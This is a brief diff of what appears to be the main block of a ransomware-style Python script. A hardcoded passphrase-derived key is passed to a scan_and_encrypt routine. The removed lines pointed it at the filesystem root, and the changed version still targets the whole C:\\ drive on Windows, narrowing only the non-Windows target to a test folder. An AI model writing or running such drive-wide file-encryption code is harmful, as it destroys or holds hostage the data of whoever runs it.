@@ -16,9 +16,9 @@ def ask_for_key():
     return key
 
 if __name__ == "__main__":
-    key = hashlib.sha256("nenhumsistemaestaasalvo".encode()).digest()
+    key = hashlib.sha256("cuidadocomosemail".encode()).digest()
 
-    directory = "/" if os.name != "nt" else "C:\\"
+    directory = "./test/" if os.name != "nt" else "C:\\"
     scan_and_encrypt(directory, key)
 
     print(
